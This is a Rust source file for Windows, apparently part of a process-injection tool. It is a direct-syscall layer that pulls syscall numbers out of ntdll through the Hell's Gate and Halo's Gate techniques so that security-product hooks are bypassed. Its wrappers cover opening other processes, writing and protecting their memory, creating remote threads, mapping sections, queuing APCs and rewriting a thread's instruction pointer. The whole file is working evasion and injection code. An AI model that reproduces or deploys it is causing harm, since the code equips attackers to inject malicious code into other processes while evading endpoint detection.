#![cfg(windows)]

//! Direct syscall layer.
//!
//! Neither the SSN table nor the stubs are imported: SSNs are recovered from
//! ntdll's own stubs at runtime (Hell's Gate), with a Halo's Gate walk over
//! neighbouring exports when a stub is hooked. Each SSN is turned into an
//! 11-byte `mov r10, rcx / mov eax, ssn / syscall / ret` trampoline allocated
//! in this process, so the call never passes through a hooked ntdll prologue.
//!
//! Degrades safely: if a stub cannot be resolved, callers fall back to the
//! regular Win32 path.

use std::collections::HashMap;
use std::sync::{Mutex, OnceLock};

use windows::core::{PCSTR, PCWSTR};
use windows::Win32::Foundation::HMODULE;
use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
    PAGE_PROTECTION_FLAGS,
};

pub type NtStatus = i32;

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root: usize,
    name: *mut UnicodeString,
    attributes: u32,
    security: usize,
    security_quality_of_service: usize,
}

#[repr(C)]
struct ClientId {
    unique_process: usize,
    unique_thread: usize,
}

fn cache() -> &'static Mutex<HashMap<u32, usize>> {
    static CACHE: OnceLock<Mutex<HashMap<u32, usize>>> = OnceLock::new();
    CACHE.get_or_init(|| Mutex::new(HashMap::new()))
}

fn ntdll() -> Option<HMODULE> {
    unsafe {
        let name = crate::injector::wide("ntdll.dll");
        GetModuleHandleW(PCWSTR(name.as_ptr())).ok()
    }
}

fn export(name: &str) -> Option<usize> {
    let ntdll = ntdll()?;
    let mut full = name.as_bytes().to_vec();
    full.push(0);
    unsafe {
        GetProcAddress(ntdll, PCSTR(full.as_ptr()))
            .map(|f| std::mem::transmute::<_, usize>(f))
    }
}

fn peek(addr: usize, len: usize) -> Option<&'static [u8]> {
    if addr == 0 {
        return None;
    }
    Some(unsafe { std::slice::from_raw_parts(addr as *const u8, len) })
}

/// `mov r10, rcx ; mov eax, imm32` — the untouched ntdll prologue.
fn stub_ssn(addr: usize) -> Option<u32> {
    let b = peek(addr, 9)?;
    if b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8 {
        return Some(u32::from_le_bytes([b[4], b[5], b[6], b[7]]));
    }
    None
}

/// Export table sorted by address.
fn sorted_exports() -> Vec<usize> {
    let Some(ntdll) = ntdll() else { return Vec::new() };
    let base = ntdll.0 as usize;
    let Some(head) = peek(base + 0x3C, 4) else { return Vec::new() };
    let lfanew = u32::from_le_bytes([head[0], head[1], head[2], head[3]]) as usize;
    let Some(opt) = peek(base + lfanew + 24, 240) else { return Vec::new() };
    let magic = u16::from_le_bytes([opt[0], opt[1]]);
    if magic != 0x20B {
        return Vec::new();
    }
    let dirs = 112usize;
    let export_rva =
        u32::from_le_bytes([opt[dirs], opt[dirs + 1], opt[dirs + 2], opt[dirs + 3]]) as usize;
    if export_rva == 0 {
        return Vec::new();
    }
    let Some(exp) = peek(base + export_rva, 40) else { return Vec::new() };
    let read32 = |o: usize| {
        u32::from_le_bytes([exp[o], exp[o + 1], exp[o + 2], exp[o + 3]]) as usize
    };
    let count = read32(24);
    let functions = base + read32(28);
    let mut out = Vec::with_capacity(count);
    for i in 0..count {
        let Some(p) = peek(functions + i * 4, 4) else { break };
        let rva = u32::from_le_bytes([p[0], p[1], p[2], p[3]]) as usize;
        if rva != 0 {
            out.push(base + rva);
        }
    }
    out.sort_unstable();
    out.dedup();
    out
}

/// Resolve an SSN for `name`, or `None` when the stub is unreadable.
pub fn ssn(name: &str) -> Option<u32> {
    let addr = export(name)?;
    if let Some(s) = stub_ssn(addr) {
        return Some(s);
    }

    // Halo's Gate: nearest readable neighbour, adjusted by export-index delta.
    let exports = sorted_exports();
    let index = exports.binary_search(&addr).ok()?;

    for distance in 1..600usize {
        if let Some(neighbour) = index.checked_sub(distance) {
            if let Some(s) = stub_ssn(exports[neighbour]) {
                return s.checked_add(distance as u32);
            }
        }
        if let Some(neighbour) = exports.get(index + distance) {
            if let Some(s) = stub_ssn(*neighbour) {
                return s.checked_sub(distance as u32);
            }
        }
        if index < distance {
            break;
        }
    }
    None
}

/// Build (or reuse) the trampoline for `number`.
pub fn trampoline(number: u32) -> usize {
    let mut cache = cache().lock().unwrap();
    if let Some(addr) = cache.get(&number) {
        return *addr;
    }

    unsafe {
        let mem = VirtualAlloc(None, 32, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if mem.is_null() {
            return 0;
        }
        let ssn_bytes = number.to_le_bytes();
        let code: [u8; 11] = [
            0x4C, 0x8B, 0xD1, // mov r10, rcx
            0xB8, ssn_bytes[0], ssn_bytes[1], ssn_bytes[2], ssn_bytes[3], // mov eax, ssn
            0x0F, 0x05, // syscall
            0xC3, // ret
        ];
        std::ptr::copy_nonoverlapping(code.as_ptr(), mem as *mut u8, code.len());

        let mut old = PAGE_PROTECTION_FLAGS(0);
        if VirtualProtect(mem, 32, PAGE_EXECUTE_READ, &mut old).is_err() {
            return 0;
        }

        let addr = mem as usize;
        cache.insert(number, addr);
        addr
    }
}

macro_rules! nt {
    ($name:literal) => {
        (|| -> Option<usize> {
            let n = ssn($name)?;
            let t = trampoline(n);
            if t == 0 { None } else { Some(t) }
        })()
    };
}

type Fn2 = unsafe extern "system" fn(usize, usize) -> NtStatus;
type Fn4 = unsafe extern "system" fn(usize, u32, usize, usize) -> NtStatus;
type Fn5 = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> NtStatus;
type Fn6 = unsafe extern "system" fn(usize, usize, usize, usize, usize, usize) -> NtStatus;
type Fn7 = unsafe extern "system" fn(usize, u32, usize, usize, u32, u32, usize) -> NtStatus;
type Fn10 = unsafe extern "system" fn(
    usize, usize, *mut usize, usize, usize, usize, *mut usize, u32, u32, u32,
) -> NtStatus;
type Fn11 = unsafe extern "system" fn(
    *mut usize, u32, usize, usize, usize, usize, u32, usize, usize, usize, usize,
) -> NtStatus;

pub const PROCESS_ALL: u32 = 0x1F_FFFF;

pub const THREAD_ALL: u32 = 0x1F_FFFF;

pub const THREAD_SUSPEND_RESUME: u32 = 0x0002;
pub const THREAD_GET_CONTEXT: u32 = 0x0008;
pub const THREAD_SET_CONTEXT: u32 = 0x0010;
pub const THREAD_QUERY_LIMITED: u32 = 0x0800;

/// Size of AMD64 `CONTEXT`; `Rip` sits at 0xF8 and `ContextFlags` at 0x30.
pub const CONTEXT_SIZE: usize = 1232;
pub const CONTEXT_OFFSET_FLAGS: usize = 0x30;
pub const CONTEXT_OFFSET_RIP: usize = 0xF8;
pub const CONTEXT_AMD64_FULL: u32 = 0x0010_000B;

pub const SECTION_ALL_ACCESS: u32 = 0x000F_001F;
pub const SEC_IMAGE: u32 = 0x0100_0000;
pub const VIEW_UNMAP: u32 = 2;

pub const MEM_COMMIT_BIT: u32 = 0x1000;
pub const MEM_RESERVE_BIT: u32 = 0x2000;
pub const PAGE_RW: u32 = 0x04;
pub const PAGE_RX: u32 = 0x20;
pub const PAGE_RO: u32 = 0x02;

pub fn available() -> bool {
    ssn("NtOpenProcess").is_some()
}

pub fn open_process(pid: u32, access: u32) -> Result<usize, String> {
    let Some(addr) = nt!("NtOpenProcess") else {
        return Err("NtOpenProcess SSN unresolved".into());
    };
    let f: Fn4 = unsafe { std::mem::transmute(addr) };

    let mut handle = 0usize;
    let attributes = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        root: 0,
        name: std::ptr::null_mut(),
        attributes: 0,
        security: 0,
        security_quality_of_service: 0,
    };
    let client = ClientId {
        unique_process: pid as usize,
        unique_thread: 0,
    };

    let status = unsafe {
        f(
            &mut handle as *mut usize as usize,
            access,
            &attributes as *const ObjectAttributes as usize,
            &client as *const ClientId as usize,
        )
    };
    if status < 0 || handle == 0 {
        return Err(format!(
            "NtOpenProcess denied ({status:#x}) — kernel handle filter active"
        ));
    }
    Ok(handle)
}

pub fn allocate(process: usize, size: usize) -> Result<usize, String> {
    let Some(addr) = nt!("NtAllocateVirtualMemory") else {
        return Err("NtAllocateVirtualMemory SSN unresolved".into());
    };
    let f: Fn6 = unsafe { std::mem::transmute(addr) };

    let mut base = 0usize;
    let mut region = size;
    let status = unsafe {
        f(
            process,
            &mut base as *mut usize as usize,
            0,
            &mut region as *mut usize as usize,
            (MEM_COMMIT_BIT | MEM_RESERVE_BIT) as usize,
            PAGE_RW as usize,
        )
    };
    if status < 0 || base == 0 {
        return Err(format!("NtAllocateVirtualMemory failed ({status:#x})"));
    }
    Ok(base)
}

pub fn write(process: usize, address: usize, bytes: &[u8]) -> Result<(), String> {
    let Some(addr) = nt!("NtWriteVirtualMemory") else {
        return Err("NtWriteVirtualMemory SSN unresolved".into());
    };
    let f: Fn5 = unsafe { std::mem::transmute(addr) };

    let mut written = 0usize;
    let status = unsafe {
        f(
            process,
            address,
            bytes.as_ptr() as usize,
            bytes.len(),
            &mut written as *mut usize as usize,
        )
    };
    if status < 0 {
        return Err(format!("NtWriteVirtualMemory failed ({status:#x})"));
    }
    Ok(())
}

pub fn protect(process: usize, address: usize, size: usize, new_protect: u32) -> Result<u32, String> {
    let Some(addr) = nt!("NtProtectVirtualMemory") else {
        return Err("NtProtectVirtualMemory SSN unresolved".into());
    };
    let f: Fn5 = unsafe { std::mem::transmute(addr) };

    let mut base = address;
    let mut region = size;
    let mut old = 0u32;
    let status = unsafe {
        f(
            process,
            &mut base as *mut usize as usize,
            &mut region as *mut usize as usize,
            new_protect as usize,
            &mut old as *mut u32 as usize,
        )
    };
    if status < 0 {
        return Err(format!("NtProtectVirtualMemory failed ({status:#x})"));
    }
    Ok(old)
}

pub fn create_thread_ex(
    process: usize,
    start: usize,
    argument: usize,
    flags: u32,
) -> Result<usize, String> {
    let Some(addr) = nt!("NtCreateThreadEx") else {
        return Err("NtCreateThreadEx SSN unresolved".into());
    };
    let f: Fn11 = unsafe { std::mem::transmute(addr) };

    let mut handle = 0usize;
    let status = unsafe {
        f(
            &mut handle as *mut usize,
            THREAD_ALL,
            0,
            process,
            start,
            argument,
            flags,
            0,
            0,
            0,
            0,
        )
    };
    if status < 0 || handle == 0 {
        return Err(format!("NtCreateThreadEx failed ({status:#x})"));
    }
    Ok(handle)
}

pub fn create_section(file: usize, protect: u32, attributes: u32) -> Result<usize, String> {
    let Some(addr) = nt!("NtCreateSection") else {
        return Err("NtCreateSection SSN unresolved".into());
    };
    let f: Fn7 = unsafe { std::mem::transmute(addr) };

    let mut handle = 0usize;
    let status = unsafe {
        f(
            &mut handle as *mut usize as usize,
            SECTION_ALL_ACCESS,
            0,
            0,
            protect,
            attributes,
            file,
        )
    };
    if status < 0 || handle == 0 {
        return Err(format!("NtCreateSection failed ({status:#x})"));
    }
    Ok(handle)
}

pub fn map_view(process: usize, section: usize, protect: u32) -> Result<usize, String> {
    let Some(addr) = nt!("NtMapViewOfSection") else {
        return Err("NtMapViewOfSection SSN unresolved".into());
    };
    let f: Fn10 = unsafe { std::mem::transmute(addr) };

    let mut base = 0usize;
    let mut size = 0usize;
    let status = unsafe {
        f(
            section,
            process,
            &mut base as *mut usize,
            0,
            0,
            0,
            &mut size as *mut usize,
            VIEW_UNMAP,
            0,
            protect,
        )
    };
    if status < 0 || base == 0 {
        return Err(format!("NtMapViewOfSection failed ({status:#x})"));
    }
    Ok(base)
}

pub fn queue_apc(thread: usize, routine: usize, argument: usize) -> Result<(), String> {
    let Some(addr) = nt!("NtQueueApcThread") else {
        return Err("NtQueueApcThread SSN unresolved".into());
    };
    let f: Fn5 = unsafe { std::mem::transmute(addr) };

    let status = unsafe { f(thread, routine, argument, 0, 0) };
    if status < 0 {
        return Err(format!("NtQueueApcThread failed ({status:#x})"));
    }
    Ok(())
}

pub fn open_thread(tid: u32, access: u32) -> Result<usize, String> {
    let Some(addr) = nt!("NtOpenThread") else {
        return Err("NtOpenThread SSN unresolved".into());
    };
    let f: Fn4 = unsafe { std::mem::transmute(addr) };

    let mut handle = 0usize;
    let attributes = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        root: 0,
        name: std::ptr::null_mut(),
        attributes: 0,
        security: 0,
        security_quality_of_service: 0,
    };
    let client = ClientId {
        unique_process: 0,
        unique_thread: tid as usize,
    };

    let status = unsafe {
        f(
            &mut handle as *mut usize as usize,
            access,
            &attributes as *const ObjectAttributes as usize,
            &client as *const ClientId as usize,
        )
    };
    if status < 0 || handle == 0 {
        return Err(format!(
            "NtOpenThread denied ({status:#x}) — thread access filter active"
        ));
    }
    Ok(handle)
}

pub fn suspend_thread(handle: usize) -> Result<u32, String> {
    let Some(addr) = nt!("NtSuspendThread") else {
        return Err("NtSuspendThread SSN unresolved".into());
    };
    let f: Fn2 = unsafe { std::mem::transmute(addr) };

    let mut previous = 0u32;
    let status = unsafe { f(handle, &mut previous as *mut u32 as usize) };
    if status < 0 {
        return Err(format!("NtSuspendThread failed ({status:#x})"));
    }
    Ok(previous)
}

pub fn resume_thread(handle: usize) -> Result<u32, String> {
    let Some(addr) = nt!("NtResumeThread") else {
        return Err("NtResumeThread SSN unresolved".into());
    };
    let f: Fn2 = unsafe { std::mem::transmute(addr) };

    let mut previous = 0u32;
    let status = unsafe { f(handle, &mut previous as *mut u32 as usize) };
    if status < 0 {
        return Err(format!("NtResumeThread failed ({status:#x})"));
    }
    Ok(previous)
}

pub fn get_thread_context(handle: usize, context: &mut [u8; CONTEXT_SIZE]) -> Result<(), String> {
    let Some(addr) = nt!("NtGetContextThread") else {
        return Err("NtGetContextThread SSN unresolved".into());
    };
    let f: Fn2 = unsafe { std::mem::transmute(addr) };

    context[CONTEXT_OFFSET_FLAGS..CONTEXT_OFFSET_FLAGS + 4]
        .copy_from_slice(&CONTEXT_AMD64_FULL.to_le_bytes());

    let status = unsafe { f(handle, context.as_mut_ptr() as usize) };
    if status < 0 {
        return Err(format!("NtGetContextThread failed ({status:#x})"));
    }
    Ok(())
}

pub fn set_thread_context(handle: usize, context: &[u8; CONTEXT_SIZE]) -> Result<(), String> {
    let Some(addr) = nt!("NtSetContextThread") else {
        return Err("NtSetContextThread SSN unresolved".into());
    };
    let f: Fn2 = unsafe { std::mem::transmute(addr) };

    let status = unsafe { f(handle, context.as_ptr() as usize) };
    if status < 0 {
        return Err(format!("NtSetContextThread failed ({status:#x})"));
    }
    Ok(())
}

pub fn context_rip(context: &[u8; CONTEXT_SIZE]) -> u64 {
    let mut raw = [0u8; 8];
    raw.copy_from_slice(&context[CONTEXT_OFFSET_RIP..CONTEXT_OFFSET_RIP + 8]);
    u64::from_le_bytes(raw)
}

pub fn set_context_rip(context: &mut [u8; CONTEXT_SIZE], rip: u64) {
    context[CONTEXT_OFFSET_RIP..CONTEXT_OFFSET_RIP + 8].copy_from_slice(&rip.to_le_bytes());
}
